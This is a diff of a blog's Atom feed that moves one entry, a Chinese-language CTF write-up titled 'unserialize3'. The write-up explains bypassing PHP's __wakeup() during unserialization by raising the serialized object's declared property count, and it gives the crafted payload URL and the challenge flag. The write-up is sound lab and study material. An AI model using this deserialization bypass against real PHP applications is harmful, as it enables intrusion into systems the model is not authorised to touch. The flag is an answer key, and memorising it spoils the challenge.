@@ -256,6 +256,31 @@
   </entry>
   
   <entry>
+    <title>unserialize3</title>
+    <link href="https://singlemindedt.github.io/2020/02/13/unserialize3/"/>
+    <id>https://singlemindedt.github.io/2020/02/13/unserialize3/</id>
+    <published>2020-02-13T07:26:35.000Z</published>
+    <updated>2020-02-25T14:29:30.815Z</updated>
+    
+    <content type="html"><![CDATA[<p>根据题目及下面的代码：<br><img src="https://s2.ax1x.com/2020/02/13/1Lw8Ds.png" alt="1Lw8Ds.png"><br>定义了类xctf，其中有flag变量，并调用了_wakeup()，则考虑实例化xctf类并将其变量序列化。<br>根据？code= 猜测可能为将序列化结果输入在?code=后POST请求；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123; </span><br><span class="line"><span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> xctf();</span><br><span class="line"><span class="keyword">print</span>(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"xctf"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"flag"</span>;s:<span class="number">3</span>:<span class="string">"111"</span>;&#125;</span><br></pre></td></tr></table></figure><p>将此结构键入，会得到“bad requests”，并推出脚本,即执行了_wakeup()。因此应想办法绕过_wakeup();<br><strong><strong>wakeup()执行漏洞：一个字符串或对象被序列化后，如果其属性被修改，对象属性个数的值大于真实个数的属性时，则不会执行</strong>wakeup()函数</strong><br>payload:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://111.198.29.45:30964/?code=O:4:<span class="number">%22</span>xctf<span class="number">%22</span>:3:&#123;s:4:<span class="number">%22</span>flag<span class="number">%22</span>;s:3:<span class="number">%22111</span><span class="number">%22</span>;&#125;即只需要将属性改为大于现属性数即可；</span><br></pre></td></tr></table></figure><p>得到结果：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">the answer <span class="keyword">is</span> : <span class="type">cyberpeace</span>&#123;<span class="number">4</span>ca0babcfe2c461d7b7dafca84b009bb&#125;</span><br></pre></td></tr></table></figure><p>关于<a href="https://singlemindedt.github.io/2020/02/13/PHP序列化与发序列化/">PHP序列化</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;根据题目及下面的代码：&lt;br&gt;&lt;img src=&quot;https://s2.ax1x.com/2020/02/13/1Lw8Ds.png&quot; alt=&quot;1Lw8Ds.png&quot;&gt;&lt;br&gt;定义了类xctf，其中有flag变量，并调用了_wakeup()，则考虑实例化xctf类并将其变
+      
+    
+    </summary>
+    
+    
+      <category term="PHP" scheme="https://singlemindedt.github.io/tags/PHP/"/>
+    
+      <category term="攻防世界" scheme="https://singlemindedt.github.io/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Magic Methods（魔术函数）</title>
     <link href="https://singlemindedt.github.io/2020/02/13/Magic%E5%87%BD%E6%95%B0/"/>
     <id>https://singlemindedt.github.io/2020/02/13/Magic函数/</id>
@@ -304,31 +329,6 @@
     
     
       <category term="PHP" scheme="https://singlemindedt.github.io/tags/PHP/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>unserialize3</title>
-    <link href="https://singlemindedt.github.io/2020/02/13/unserialize3/"/>
-    <id>https://singlemindedt.github.io/2020/02/13/unserialize3/</id>
-    <published>2020-02-13T07:26:35.000Z</published>
-    <updated>2020-02-25T14:29:30.815Z</updated>
-    
-    <content type="html"><![CDATA[<p>根据题目及下面的代码：<br><img src="https://s2.ax1x.com/2020/02/13/1Lw8Ds.png" alt="1Lw8Ds.png"><br>定义了类xctf，其中有flag变量，并调用了_wakeup()，则考虑实例化xctf类并将其变量序列化。<br>根据？code= 猜测可能为将序列化结果输入在?code=后POST请求；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123; </span><br><span class="line"><span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> xctf();</span><br><span class="line"><span class="keyword">print</span>(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"xctf"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"flag"</span>;s:<span class="number">3</span>:<span class="string">"111"</span>;&#125;</span><br></pre></td></tr></table></figure><p>将此结构键入，会得到“bad requests”，并推出脚本,即执行了_wakeup()。因此应想办法绕过_wakeup();<br><strong><strong>wakeup()执行漏洞：一个字符串或对象被序列化后，如果其属性被修改，对象属性个数的值大于真实个数的属性时，则不会执行</strong>wakeup()函数</strong><br>payload:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://111.198.29.45:30964/?code=O:4:<span class="number">%22</span>xctf<span class="number">%22</span>:3:&#123;s:4:<span class="number">%22</span>flag<span class="number">%22</span>;s:3:<span class="number">%22111</span><span class="number">%22</span>;&#125;即只需要将属性改为大于现属性数即可；</span><br></pre></td></tr></table></figure><p>得到结果：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">the answer <span class="keyword">is</span> : <span class="type">cyberpeace</span>&#123;<span class="number">4</span>ca0babcfe2c461d7b7dafca84b009bb&#125;</span><br></pre></td></tr></table></figure><p>关于<a href="https://singlemindedt.github.io/2020/02/13/PHP序列化与发序列化/">PHP序列化</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;根据题目及下面的代码：&lt;br&gt;&lt;img src=&quot;https://s2.ax1x.com/2020/02/13/1Lw8Ds.png&quot; alt=&quot;1Lw8Ds.png&quot;&gt;&lt;br&gt;定义了类xctf，其中有flag变量，并调用了_wakeup()，则考虑实例化xctf类并将其变
-      
-    
-    </summary>
-    
-    
-      <category term="PHP" scheme="https://singlemindedt.github.io/tags/PHP/"/>
-    
-      <category term="攻防世界" scheme="https://singlemindedt.github.io/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
     
   </entry>
   
